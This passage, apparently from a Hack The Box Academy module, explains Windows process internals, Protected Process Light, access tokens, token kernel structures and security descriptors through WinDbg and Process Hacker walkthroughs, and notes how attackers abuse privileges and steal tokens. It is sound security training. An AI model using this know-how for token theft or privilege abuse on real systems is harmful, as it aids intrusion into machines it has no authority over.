Note: Please wait for 2-3 minutes after the target spawns before connecting to ensure the Active Directory domain environment and services are properly configured.

* * *


# Process Internals and Protection

* * *

## Windows Process

A Windows process is an instance of a running program. Each process has its own virtual address space, executable code, open handles to system objects, a security context (represented by an access token), a unique process identifier (PID), and at least one thread of execution.

The diagram below illustrates the fundamental components of a process in Windows, highlighting its memory isolation, thread execution, management of system object references, and security context.

![Process Object](https://academy.hackthebox.com/storage/modules/256/procobj.png)

At the core, the process has its own `virtual address space`, which isolates its memory from other processes. Within this space, the `primary thread` executes the process's executable code. The process also maintains a `private handle table`, which contains open handles to various system objects such as files, registry keys, and synchronization objects. These handles allow the process to interact with and manage these objects. Additionally, the process is associated with a `security context`, represented by an access token. This `token` determines the process's level of access to securable objects and system resources. Multiple threads can exist within a single process, sharing the same security context provided by the primary access token or impersonate a different security context using a different token.

## Access Token

A process is associated with an access token that defines the security context of the user account or system account under which the process runs. The access token contains information about the user's identity, group memberships, privileges, and other security attributes. This token is used by the operating system to determine the level of access the process has to system resources.

Threads within a process inherit the access token of their parent process. This means that they run in the same security context as the process that created them. Threads can also have their own access tokens, allowing them to temporarily switch to a different security context. This is often used for impersonation, where a thread temporarily assumes the identity of another user to perform specific actions on their behalf.

![Thread token](https://academy.hackthebox.com/storage/modules/256/set_thread.png)

Note that the threads within a process usually share the same security context, but can also impersonate other security contexts when necessary. We'll discuss this in detail in later sections.

## Protected processes

Process protections, like Protected Processes and Protected Process Light (PPL), are designed to enhance the security of critical system processes by restricting their access and interactions with other processes. The primary use of process protection is to enable specially signed programs to run in such a way that they are immune from tampering and termination, even by administrative users.

These processes are created by applications that have been digitally signed with a special certificate (for example, antivirus or EDR processes). This certificate is issued by Microsoft and is used to verify the authenticity of the application. By restricting access to protected processes, Windows can prevent malicious software from interfering with critical system processes.

Let's navigate to the bottom of this section and click on "Click here to spawn the target system!". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (inclduing WinDbg) are installed on the target system and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the tools at the following paths:

- **SysinternalsSuite**: `C:\Tools\SysinternalsSuite`
- **Process Explorer**: `C:\Tools\SysinternalsSuite\procexp64.exe`

The shortcut for WinDbg is saved on the desktop, start menu as well as the taskbar.

* * *

We can use Process Explorer to view the "Protection" column, which shows the protection level of each process. To view this information, go to the "View" menu and select "Select Columns". In the "Process Image" tab, check the box next to "Protection" and click "OK".

![Protected](https://academy.hackthebox.com/storage/modules/256/protected-1_.png)

Click on the "Protection" column header to sort the processes by protection level. The protected processes will be listed at the top.

![Protected](https://academy.hackthebox.com/storage/modules/256/protected1__.png)

These pieces of information about the protection levels are actually stored in the `Protection` field of the `EPROCESS` structure. The Protection member is a `PS_PROTECTION` structure containing the following three components ( [reference](https://learn.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess)):

- Type
- Audit (unused)
- Signer

The value of `Type` can be one of the following:

- `PsProtectedTypeNone`: This indicates that the process is not protected.
- `PsProtectedTypeProtectedLight`: The process is a protected process light (PPL).
- `PsProtectedTypeProtected`: The process is a protected process.

The actual protection level is a combination of `Type` and `Signer`. The following table lists the valid protection levels:

| Protection level | Type | Signer |
| --- | --- | --- |
| `PsProtectedSignerWinSystem` | Protected | WinSystem |
| `PsProtectedSignerWinTcb` | Protected | WinTcb |
| `PsProtectedSignerWinTcb-Light` | Protected light | WinTcb |
| `PsProtectedSignerWindows` | Protected | Windows |
| `PsProtectedSignerWindows-Light` | Protected light | Windows |
| `PsProtectedSignerLsa-Light` | Protected light | LSA |
| `PsProtectedSignerAntimalware-Light` | Protected light | Antimalware |
| `PsProtectedSignerAuthenticode` | Protected | Authenticode |
| `PsProtectedSignerAuthenticode-Light` | Protected light | Authenticode |
| `PsProtectedSignerNone` | None | None |

Let's verify this information in the structures for a running protected process.

## Key Structures and Enumerations

### EPROCESS

The EPROCESS structure is a kernel data structure in Windows that contains information about a process, including its executable file, security attributes, and various other properties. The Protection field in the `EPROCESS` structure provides information about whether a process is protected or not.

Let's view it by opening WinDbg and attaching it to local system.

Ensure you run WinDbg with administrative privileges. Right-click on the WinDbg shortcut and select "Run as administrator."

In WinDbg, go to the File menu and select " `Start Debugging`". Choose the " `Attach to kernel`" dialog and switch to the Local tab. Then click the OK button to start the kernel debugging session. We should be able to see the prompt `lkd>`, which indicates that we are now attached to the local kernel.

To display the type information for the `_EPROCESS` structure in WinDbg, we can use the `dt` (display type) command to view the `EPROCESS` structure:

```cmd-session
lkd> dt nt!_EPROCESS

```

When we run the command `dt nt!_EPROCESS` in WinDbg, we might see output similar to the following (the actual output may vary depending on the Windows version and symbols loaded):

```cmd-session
lkd> dt nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2d8 ProcessLock      : _EX_PUSH_LOCK
   +0x2e0 UniqueProcessId  : Ptr64 Void
   +0x2e8 ActiveProcessLinks : _LIST_ENTRY
...SNIP...
   +0x358 Token            : _EX_FAST_REF
   +0x360 MmReserved       : Uint8B
   +0x368 AddressCreationLock : _EX_PUSH_LOCK
...SNIP...
   +0x6c9 SectionSignatureLevel : UChar
   +0x6ca Protection       : _PS_PROTECTION
   +0x6cb HangCount        : Pos 0, 3 Bits
   +0x6cb GhostCount       : Pos 3, 3 Bits
...SNIP...

```

WinDbg will display the definition of the `_EPROCESS` structure, showing all its members and their offsets. This is useful for understanding the internal layout of the process structure in Windows and for navigating through it during debugging. The screenshot below shows the `Protection` field in the `_EPROCESS` structure, which provides information about whether a process is protected.

![EPROCESS](https://academy.hackthebox.com/storage/modules/256/eprocess2-1-.png)

### PS\_PROTECTION

The `dt nt!_PS_PROTECTION` command in WinDbg is used to display the layout and members of the `_PS_PROTECTION` structure. This structure is used in the Windows kernel to describe protection information for processes, including whether a process is a protected process or a Protected Process Light (PPL).

```cmd-session
lkd> dt nt!_PS_PROTECTION
   +0x000 Level            : UChar
   +0x000 Type             : Pos 0, 3 Bits
   +0x000 Audit            : Pos 3, 1 Bit
   +0x000 Signer           : Pos 4, 4 Bits

```

This contains information about the protection level alongwith the protection type and the protection signer.

### PS\_PROTECTED\_TYPE

We can also view the information about the `_PS_PROTECTED_TYPE` enumeration, which is part of the protection information for processes in the Windows kernel. This enumeration helps define the type of protection applied to a process.

```cmd-session
lkd> dt nt!_PS_PROTECTED_TYPE
   PsProtectedTypeNone = 0n0
   PsProtectedTypeProtectedLight = 0n1
   PsProtectedTypeProtected = 0n2
   PsProtectedTypeMax = 0n3

```

### PS\_PROTECTED\_SIGNER

And the signer member contains the values from the `PS_PROTECTED_SIGNER` enumeration. The `dt nt!_PS_PROTECTED_SIGNER` command in WinDbg is used to display the `_PS_PROTECTED_SIGNER` enumeration, which indicates the signer of a protected process. This enumeration helps identify which entity signed a protected process, providing additional context about the protection level and the source of the protection.

```cmd-session
lkd> dt nt!_PS_PROTECTED_SIGNER
   PsProtectedSignerNone = 0n0
   PsProtectedSignerAuthenticode = 0n1
   PsProtectedSignerCodeGen = 0n2
   PsProtectedSignerAntimalware = 0n3
   PsProtectedSignerLsa = 0n4
   PsProtectedSignerWindows = 0n5
   PsProtectedSignerWinTcb = 0n6
   PsProtectedSignerWinSystem = 0n7
   PsProtectedSignerApp = 0n8
   PsProtectedSignerMax = 0n9

```

### Inspect a Running Process (Sysmon)

Let's check the protection flag for `Sysmon64.exe` process (i.e., executable for the System Monitor). First, we can get the virtual address of the `_EPROCESS` (Extended Process) structure for the `Sysmon64.exe` process. The `!process 0 0` command in WinDbg is used to list all processes currently running on the system. We want to specifically look for the `Sysmon64.exe` process, so we can filter the output to find its details as shown below:

```cmd-session
lkd> !process 0 0 sysmon64.exe
PROCESS ffff9f8dbaa59080
    SessionId: 0  Cid: 0b38    Peb: 857cc05000  ParentCid: 0274
    DirBase: 12a6ee000  ObjectTable: ffff8e8af943c140  HandleCount: 400.
    Image: Sysmon64.exe

```

Once we have the `_EPROCESS` address, we can inspect its details using the `dt` command:

```cmd-session
lkd> dt nt!_EPROCESS ffff9f8dbaa59080
   +0x000 Pcb              : _KPROCESS
   +0x2d8 ProcessLock      : _EX_PUSH_LOCK
   +0x2e0 UniqueProcessId  : 0x00000000`00000b38 Void
   +0x2e8 ActiveProcessLinks : _LIST_ENTRY [ 0xffff9f8d`baaac368 - 0xffff9f8d`baa5b368 ]
...SNIP...
   +0x358 Token            : _EX_FAST_REF
...SNIP...
   +0x6ca Protection       : _PS_PROTECTION
...SNIP...

```

From the `_EPROCESS` structure, we can see that the protection member is at the `0x6ca` offset.

![Offset](https://academy.hackthebox.com/storage/modules/256/offset-1_.png)

So, if we add `0x6ca` to the address of Sysmon64.exe, we should be able to view the values of `PS_PROTECTION` member.

```cmd-session
lkd> dt nt!_PS_PROTECTION ffff9f8dbaa59080+0x6ca

```

We can see the values such as:

- `Type`: `0y001` in binary is equal to `1` in decimal.
- `Signer`: `0y0011` in binary is equal to `3` in decimal.

![Type, signer](https://academy.hackthebox.com/storage/modules/256/type_sign-1_.png)

Let's check what these values represent.

The first value type `1` represents that the process’s protection type is `PsProtectedTypeProtectedLight`.

![PS Type](https://academy.hackthebox.com/storage/modules/256/ps_type-1_.png)

The value of signer `3` represents that it is `PsProtectedSignerAntimalware`.

![PS Signer](https://academy.hackthebox.com/storage/modules/256/ps_signer-1_.png)

This information tells us that this process is a `Protected Process Light` (PPL) with the protection signer as `PsProtectedSignerAntimalware`. So, the combination of both the type and signer is what Process Explorer shows, i.e., `PsProtectedSignerAntimalware-Light`. Having this type of protection on a process grants limited access to outside processes when they try to access it.

* * *

## Protected processes Light

Protected Process Light (PPL) is a security feature in Windows that restricts access to certain processes to prevent malicious interference. PPL ensures that only trusted services and processes are loaded into memory, and it requires that these processes have a valid signature that meets Windows requirements.

Processes under PPL have restrictions on various actions, such as shutdown, stream deployment, access to virtual memory, debugging, copying of descriptors, changing the memory working set, and impersonation of threads. This technology is often used in anti-virus and Endpoint Detection and Response (EDR) products.

Even when running with `SYSTEM` privileges or as an elevated administrator with the `SeDebugPrivilege`, it's not possible to terminate PPL (Protected Process Light) processes. This is because non-PPL processes, like `taskkill.exe`, cannot obtain handles with the `PROCESS_TERMINATE` access right to PPL processes using APIs such as `OpenProcess`.

The screenshot below shows that the user is running as a non-PPL process but with higher privileges.

![Privileges](https://academy.hackthebox.com/storage/modules/256/proc_priv.png)

When an attempt is made to terminate the PPL protected process, an error "access denied" is returned.

![PPL-Kill](https://academy.hackthebox.com/storage/modules/256/proc_ppl_.png)

## Process Creation Techniques

One post-exploitation technique is creating a new process using a specified token located in the compromised system. Usually, to create a new process on Windows, it is necessary to use the `CreateProcess()` function. However, when creating a new process under the context of a different token, it is not sufficient to impersonate the token and call `CreateProcess()`. By default, `CreateProcess()` will create a new process using the primary token of the parent process instead of the calling thread's current token. To create a new process using a specified token, functions like `CreateProcessAsUser()` can be used. This function allows the handle of a token to be specified and used as the primary token for the newly created process.

Some of the examples of important windows API functions that are used to create a process in Windows are as follows:

- `CreateProcess()`: This [function](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) creates a new process and its primary thread. The new process runs in the security context of the calling process and uses the same access token. It's typically used to launch a new process in the same security context as the calling process.

- `CreateProcessAsUser()`: This [function](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) creates a new process with the security context of the specified user's access token. It requires the `SE_INCREASE_QUOTA_NAME` privilege and may also require the `SE_ASSIGNPRIMARYTOKEN_NAME` privilege if the token is not assignable. This function is used when you want to create a process with a different user's privileges.

- `CreateProcessWithTokenW()`: This [function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) creates a new process and its primary thread using the security context of the specified token. The calling process must have the `SE_IMPERSONATE_NAME` privilege to use this function. It's similar to `CreateProcessAsUser()` but allows you to specify an existing token rather than a user.

- `CreateProcessWithLogonW()`: This [function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw) creates a new process and its primary thread using the security context of the specified credentials (user, domain, password). It's typically used to create a process with different credentials than the currently logged-in user, such as when a service needs to run a process as a specific user.


* * *

Note: Please wait for 2-3 minutes after the target spawns before connecting to ensure the Active Directory domain environment and services are properly configured.

* * *


# Understanding Access Tokens

As per [Microsoft](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens), an access token is defined as `an object that describes the security context of a process or thread`. It contains crucial information such as the user's identity and the associated privileges. These are used by Windows to keep track of who is allowed to do what. Each process in Windows is associated with an access token that defines the security context of the user account or service under which the process is running.

When a user logs in, the system creates an access token for the user. This token contains information about the user's account, such as the username, the groups the user is a part of, and what the user is allowed to do on the computer.

![ms_access_token](https://academy.hackthebox.com/storage/modules/256/mstoken.png)

## Primary and Impersonation Tokens

After successful authentication, the system generates an access token which is then used by every process that runs on behalf of that user, ensuring they have the necessary permissions and restrictions.

There are two main types of access tokens:

- `Primary Tokens`: These tokens are created for each user when they log in. They're like the personal access pass for using programs and accessing files.

- `Impersonation Tokens`: These tokens are used by programs to temporarily act as if they were you. It's like lending your access pass to someone else for a specific task.


Each process in Windows possesses a `primary token` that defines the security context of the user account linked with the process. When a thread from the process interacts with a [securable object](https://learn.microsoft.com/en-us/windows/win32/secauthz/securable-objects), the system utilizes the primary token by default. Threads can also `impersonate` a client account, enabling them to interact with securable objects using the client's security context. Threads in an impersonating state possess both a primary token and an impersonation token.

The diagram below illustrates the flow of the access token initialization process from interactive logon to the creation of a primary access token for a user process like `explorer.exe`.

![Logon Process](https://academy.hackthebox.com/storage/modules/256/logon_.png)

The user provides their credentials (username and password) for interactive logon. Then LSA is responsible for validating the user's credentials and creating the initial logon session. The LSA creates an access token that contains the user's security identifier (SID), group SIDs, and privileges. The `userinit.exe` process is responsible for setting up the user's environment, including launching the Windows Explorer shell ( `explorer.exe`), which is the user interface for the desktop environment, providing access to files, folders, and applications.

## Access Token Contents

Access tokens are packed with important information that defines a user's security context. This information includes:

- The `user's SID` (Security Identifier), which uniquely identifies the user's account.
- `SIDs for the groups` the user belongs to, helping define group permissions.
- ID related to the logon session (helps to identify the current logon session).
- A list of `privileges` held by the user or their groups, determining what actions they can perform.
- An `owner SID`, indicating who owns the token.
- The SID for the primary group, which determines the default group ownership for objects the user creates.
- The default `DACL` (Discretionary Access Control List), used when the user creates objects without specifying a security descriptor.
- The `token's source`, indicating how it was created.
- Information on whether the token is a `primary` or `impersonation` token.
- An optional list of restricting SIDs, limiting the token's use.
- Current `impersonation levels`, defining the extent to which the token can act on behalf of another user.
- Various statistics and details about the token's status and usage.

Let's navigate to the bottom of this section and click on "Click here to spawn the target system!". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (including WinDbg) are installed on the target system, and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the tools at the following paths:

- **SysinternalsSuite**: `C:\Tools\SysinternalsSuite`
- **Process Hacker**: `C:\Tools\ProcessHacker\ProcessHacker.exe`

In Process Hacker, we can see the contents of an access token (under the Token menu), as shown in the screenshot below.

![Token Properties](https://academy.hackthebox.com/storage/modules/256/token_prop1_.png)

Click on Advanced to view more properties of a token.

![Token Properties](https://academy.hackthebox.com/storage/modules/256/token_prop2_.png)

## Explore tokens using PowerShell

We can also install the PowerShell module `NTObjectManager` (part of [sandbox-attacksurface-analysis-tools](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) from Google Project Zero), which can help us understand the tokens in detail. It also has a Token Viewer component that we can use to explore the token objects.

This module can easily be installed using the command below in PowerShell:

```powershell
PS C:\> Install-Module NTObjectManager

```

In the module's target (VM), this module is already installed. We can open the Token Viewer using the below command:

```powershell
PS C:\> Show-NtToken -All

```

This opens the Token Viewer user interface, where we can open and query the token object for the running processes. Right-click any item and click on "Open Token" to view the token information.

![Token Viewer](https://academy.hackthebox.com/storage/modules/256/tokenview2_.png)

For example, the screenshot below shows the token information for the process `ShellExperienceHost.exe` running under the security context of `LEGACY\normal.user`.

![Token Viewer](https://academy.hackthebox.com/storage/modules/256/tokenview3_.png)

We can also view other information related to the token, such as the groups and privileges, as shown in the other tabs.

## Restricted token

A restricted token is an access token that has been altered by the [CreateRestrictedToken()](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-createrestrictedtoken) function. This modification limits the abilities of a process or an impersonating thread that operates within the security context of the token. The `CreateRestrictedToken` function can impose restrictions on a token in several ways, such as:

- Removing privileges from the token.
- Applying the deny-only attribute to Security Identifiers (SIDs) in the token, preventing them from being used to access secured objects.
- Specifying a list of restricting SIDs, which restrict access to securable objects.

When a process or thread with a restricted token attempts to access a securable object, the system conducts two access checks. The first check uses the token's enabled SIDs, while the second uses the list of restricting SIDs. Access is granted only if both checks allow the requested access rights. This dual-check mechanism ensures that access is tightly controlled, enhancing system security.

![Restricted Token](https://academy.hackthebox.com/storage/modules/256/restricted_.png)

An example is processes like `msedge.exe` (Microsoft Edge), `firefox.exe` (Mozilla Firefox), and `chrome.exe` (Google Chrome) web browsers that may run with the restricted token, such as the "Untrusted" integrity level, as shown in the screenshot below. This is because web browsers operate in a sandbox environment, as they interact with content from the internet, which can include malicious scripts or content. Running these browsers at a lower integrity level helps to mitigate the risk of them being exploited by malicious actors.

![Restricted Token](https://academy.hackthebox.com/storage/modules/256/restricted_untrusted_.png)

* * *

Note: Please wait for 2-3 minutes after the target spawns before connecting to ensure the Active Directory domain environment and services are properly configured.

* * *


# Important Token Structures

* * *

For both offensive and defensive security professionals, it is good to have an understanding of the `TOKEN` structure and key components of Windows access tokens, such as `SEP_TOKEN_PRIVILEGES`, `TOKEN_TYPE`, `SECURITY_IMPERSONATION_LEVEL`, and `SEP_LOGON_SESSION_REFERENCES`. Security tools rely on analyzing tokens to detect anomalies such as unauthorized impersonation or token duplication. In this section, we'll see what these structures and their components represent to gain insights into how tokens are represented in memory.

As shown in the screenshot below, we can see that the `TOKEN` structure contains various data structures that define attributes and information related to the token for the logged-in user.

![Token Structure](https://academy.hackthebox.com/storage/modules/256/token_str_.png)

Some key components of the TOKEN structure include the `TokenId`, which uniquely identifies the token, the `Privileges` array, which lists the privileges assigned to the user, and `TokenType`, which specifies whether the token is a Primary token or an Impersonation token.

Let's navigate to the bottom of this section and click on "Click here to spawn the target system!". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (inclduing WinDbg) are installed on the target system and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the tools at the following paths:

- **SysinternalsSuite**: `C:\Tools\SysinternalsSuite`
- **Process Hacker**: `C:\Tools\ProcessHacker\ProcessHacker.exe`

The shortcut for `WinDbg` is saved on the desktop, start menu, and taskbar. We can open WinDbg and start debugging by going to `File > Start debugging > Attach to Kernel > Local`, as instructed in the "Introduction to Tools" section.

## TOKEN Structure

The `TOKEN` structure is a fundamental security object in Windows that represents an authenticated user process. Each process is assigned a token, which serves as the default token for all threads within that process. However, individual threads can be assigned a different token, overriding the process's default token.

To understand the layout of the `_TOKEN` structure, including its fields and their data types, we can use the WinDbg command shown below:

```cmd-session
dt nt!_TOKEN

```

This command lists all the fields in the `_TOKEN` structure, showing their offsets and types.

```cmd-session
lkd> dt nt!_TOKEN
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER
   +0x030 TokenLock        : Ptr64 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
...SNIP...
   +0x0c0 TokenType        : _TOKEN_TYPE
   +0x0c4 ImpersonationLevel : _SECURITY_IMPERSONATION_LEVEL
   +0x0c8 TokenFlags       : Uint4B
   +0x0cc TokenInUse       : UChar
   +0x0d0 IntegrityLevelIndex : Uint4B
   +0x0d4 MandatoryPolicy  : Uint4B
   +0x0d8 LogonSession     : Ptr64 _SEP_LOGON_SESSION_REFERENCES
...SNIP...
   +0x450 TrustLevelSid    : Ptr64 Void
   +0x458 TrustLinkedToken : Ptr64 _TOKEN
...SNIP...

```

From this output, we learn about the fields in the token structure. In the following sections, we'll see some detailed information about a specific token object in memory. The `TOKEN` structure encapsulates a wealth of information critical to user authentication and security. It includes details such as the token's type, the privileges granted to it, the level of impersonation allowed, and essential user and group information. Now, we will explore some of the useful data structures from the `_TOKEN` structure, such as `SEP_TOKEN_PRIVILEGES`, `TOKEN_TYPE`, `_SECURITY_IMPERSONATION_LEVEL` and `SEP_LOGON_SESSION_REFERENCES`.

### SEP\_TOKEN\_PRIVILEGES

The `SEP_TOKEN_PRIVILEGES` structure is a repository of information concerning the privileges associated with a token. It encompasses details on the privileges that are present, those that are currently enabled (either externally or by default), and those that are enabled by default for the token.

The WinDbg command to get this information is as follows:

```cmd-session
lkd> dt nt!_SEP_TOKEN_PRIVILEGES
   +0x000 Present          : Uint8B
   +0x008 Enabled          : Uint8B
   +0x010 EnabledByDefault : Uint8B

```

Some of the key privileges include:

- `SeDebugPrivilege`: Allows processes to debug others, often abused for token theft or injection.
- `SeImpersonatePrivilege`: Enables impersonation of another security context, commonly exploited using techniques like JuicyPotato.
- `SeAssignPrimaryTokenPrivilege`: Allows the assignment of a token to a process, a vector for process manipulation.

Attackers exploit elevated privileges to perform unauthorized actions.

### TOKEN\_TYPE

The `TOKEN_TYPE` member specifies the type of the token, indicating whether it is a primary token or an impersonation token. Primary tokens are used to represent a user's identity, while impersonation tokens are used to temporarily adopt the security attributes of another user.

The WinDbg command to get this information is as follows:

```cmd-session
lkd> dt nt!_TOKEN_TYPE
   TokenPrimary = 0n1
   TokenImpersonation = 0n2

```

Token type can indicate whether a thread is impersonating a user (common in malicious behavior).

### SECURITY\_IMPERSONATION\_LEVEL

The `SECURITY_IMPERSONATION_LEVEL` enumeration defines constants that dictate the level at which one process can impersonate the security context of another. It determines the extent to which the calling process can mimic the security attributes of the target process.

The WinDbg command to get this information is as follows:

```cmd-session
lkd> dt nt!_SECURITY_IMPERSONATION_LEVEL
   SecurityAnonymous = 0n0
   SecurityIdentification = 0n1
   SecurityImpersonation = 0n2
   SecurityDelegation = 0n3

```

Attackers abuse `SecurityImpersonation` or `SecurityDelegation` levels to perform unauthorized actions on local or remote systems.

### SEP\_LOGON\_SESSION\_REFERENCES

A LogonSession, represented by the `_SEP_LOGON_SESSION_REFERENCES` structure, is a security context in Windows that corresponds to a user's logon session. It contains various pieces of information related to the user's session, such as the LogonId (a locally unique identifier for the session), the user's account name and authority name, and a reference count indicating the number of references to the session. Additionally, it includes a token pointer pointing to the access token associated with the session, a device map pointer, and handles for cached objects related to the session.

The WinDbg command to get this information is as follows:

```cmd-session
lkd> dt nt!_SEP_LOGON_SESSION_REFERENCES
   +0x000 Next             : Ptr64 _SEP_LOGON_SESSION_REFERENCES
   +0x008 LogonId          : _LUID
   +0x010 BuddyLogonId     : _LUID
   +0x018 ReferenceCount   : Int8B
   +0x020 Flags            : Uint4B
   +0x028 pDeviceMap       : Ptr64 _DEVICE_MAP
   +0x030 Token            : Ptr64 Void
   +0x038 AccountName      : _UNICODE_STRING
   +0x048 AuthorityName    : _UNICODE_STRING
   +0x058 CachedHandlesTable : _SEP_CACHED_HANDLES_TABLE
   +0x068 SharedDataLock   : _EX_PUSH_LOCK
   +0x070 SharedClaimAttributes : Ptr64 _AUTHZBASEP_CLAIM_ATTRIBUTES_COLLECTION
   +0x078 SharedSidValues  : Ptr64 _SEP_SID_VALUES_BLOCK
   +0x080 RevocationBlock  : _OB_HANDLE_REVOCATION_BLOCK
   +0x0a0 ServerSilo       : Ptr64 _EJOB
   +0x0a8 SiblingAuthId    : _LUID
   +0x0b0 TokenList        : _LIST_ENTRY

```

This field tracks references to logon sessions, mapping tokens to their associated logon session. Each logon session is uniquely identified by a Logon ID (LUID). Attackers often steal tokens associated with high-privilege logon sessions. This information allows defenders to trace actions performed under a specific logon session.

* * *

Note: Please wait for 2-3 minutes after the target spawns before connecting to ensure the Active Directory domain environment and services are properly configured.

* * *


# Access Checks

If a process or thread attempts to access a resource (such as a file, registry key, or network resource), Windows performs an access check using the access token associated with that process or thread to determine if the requested access is allowed based on the security settings of the resource. If the access token does not have the necessary permissions, the access request is denied.

![sd](https://academy.hackthebox.com/storage/modules/256/sd_.png)

In the example shown in the screenshot above, a thread's access token security information is checked against the target object's security descriptor. As an example, the user `HTB-User` is denied access to the file object because of an [ACE](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries) specified in the object's [DACL](https://learn.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces).

When an object is created in Windows, a [security descriptor](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptors) is typically created along with it. The system assigns a default security descriptor to the object based on the object's type and the security settings of its parent object, if applicable. This default security descriptor includes a default owner, group, DACL, and SACL. However, the creator of the object can also specify a custom security descriptor at creation time, providing more control over the object's security settings.

## Security Descriptor

While tokens authenticate a user's identity, the other important data structure that hold the security information associated with an object, is known as a security descriptor. A security descriptor is a data structure in Windows that defines the security attributes of an object, such as a file, registry key, or process. It includes information about the object's owner, group, and discretionary access control list (DACL), which specifies who can access the object and what permissions they have. The security descriptor can also include a system access control list (SACL) for generating audit events when specific actions are taken on the object.

Let's navigate to the bottom of this section and click on "Click here to spawn the target system!". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (inclduing WinDbg) are installed on the target system and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Note: The shortcut for WinDbg is saved on the Desktop, start menu, and on the taskbar.

In WinDbg, the command to display the contents of the `_SECURITY_DESCRIPTOR` structure is as follows:

```cmd-session
lkd> dt nt!_SECURITY_DESCRIPTOR

```

![SD Structure](https://academy.hackthebox.com/storage/modules/256/sd-struct_.png)

Security descriptors contains key attributes, including the revision number indicating the SRM (Security Reference Model) security model version, optional flags defining descriptor behavior, the owner's SID, and the group SID. Additionally, the descriptor includes a Discretionary Access Control List (DACL) detailing object access permissions and a System Access Control List (SACL) specifying operations to log in the security audit log and the object's explicit integrity level. The key components of a security descriptor are as follows:

- `Revision number`: This indicates the version of the SRM security model used to create the descriptor.

- `Flags`: Optional modifiers defining the behavior or characteristics of the descriptor.

- `Owner SID`: The SID of the object's owner.

- `Group SID`: The SID of the object's primary group (primarily used by the POSIX subsystem, now obsolete).

- `DACL (Discretionary Access Control List)`: Specifies who has what access to the object.

- `SACL (System Access Control List)`: Specifies which operations by which users should be logged in the security audit log and the explicit integrity level of an object.


The screenshot below shows the contents of a security descriptor for a running process.

![SD](https://academy.hackthebox.com/storage/modules/256/sd_value.png)

An access control list (ACL) consists of a header and one or more access control entry (ACE) structures. There are two main types of ACLs:

- Discretionary ACLs (DACLs)
- System ACLs (SACLs)

In a DACL, each ACE contains a Security Identifier (SID) and an access mask, which typically specifies the permissions (read, write, delete, etc.) granted or denied to the SID.

There are nine types of ACEs that can appear in a DACL:

- access allowed
- access denied
- allowed object
- denied object
- allowed callback
- denied callback
- allowed object callback
- denied object callback
- conditional claims

A System ACL (SACL) contains two kinds of Access Control Entries (ACEs):

- System Audit ACEs
- System Audit Object ACEs.

These ACEs define which actions taken on the object by particular users or groups should be logged for auditing purposes. The audit information is recorded in the system audit log.

The diagram below illustrates a file object with its Discretionary Access Control List (DACL). In this representation, the first ACE denies the user HTB-User the ability to read, write, and execute the file, while the second ACE allows write access to the file for members of the `Group 1` group. The third ACE grants execute access to all other users (Everyone).

![DACL](https://academy.hackthebox.com/storage/modules/256/dacl1_.png)

> Security Descriptor DACL answers the question, " `What kind of access is allowed?`".

Windows performs the access verification by going through each ACE entry in the DACL.

## Viewing a security descriptor

1. Begin local kernel debugging.

2. Use the command `!process 0 0 winlogon.exe` to gather process details for the Winlogon process.


![Winlogon](https://academy.hackthebox.com/storage/modules/256/sd1.png)

1. Use the address from the output of the previous command as an argument for the `!object` command to display the object data structure.

![Winlogon](https://academy.hackthebox.com/storage/modules/256/sd2.png)

1. Enter the command `dt nt!_OBJECT_HEADER` followed by the address of the object header field obtained from the previous command's output. This will display the object header data structure, including the security descriptor pointer value.

![Winlogon](https://academy.hackthebox.com/storage/modules/256/sd3.png)

1. To dump the security descriptor, use the debugger's `!sd` command with the security descriptor address displayed in the object header structure to achieve this.

![Winlogon](https://academy.hackthebox.com/storage/modules/256/sd4.png)

It seems there might be an issue reading the security descriptor at the specified address.

```cmd-session
lkd> !sd 0xffff9c0e`8ae78f2e
1100000001001c: Unable to get MIN SID header
1100000001001c: Unable to read in Owner in SD

```

`SecurityDescriptor` is actually of type `EX_FAST_REF`. In the `EX_FAST_REF` structure, the 4 low-order bits are used to store a reference count or other information.

```cmd-session
lkd> dt nt!_EX_FAST_REF
   +0x000 Object           : Ptr64 Void
   +0x000 RefCnt           : Pos 0, 4 Bits
   +0x000 Value            : Uint8B

```

To fix this, we need to ensure that the low-order bits used as flags in the token pointer are zeroed before following the pointer. On a 32-bit system, clear `3` flag bits. On a 64-bit system, clear `4` flag bits. By clearing these 4 bits, we ensure that the address points to the actual start of the security descriptor structure, allowing it to be correctly interpreted and processed in WinDbg by the `!sd` function.

We can use the hexadecimal value `0x10` as a mask to clear the lower 4 bits of the address. Performing a bitwise `AND` operation ( `&`) with this mask effectively sets the last 4 bits of the address to zero. Using the `?` command, we can evaluate the value that comes after the AND operation.

```cmd-session
lkd> ? (0xffff9c0e`8ae78f2e & -0x10)
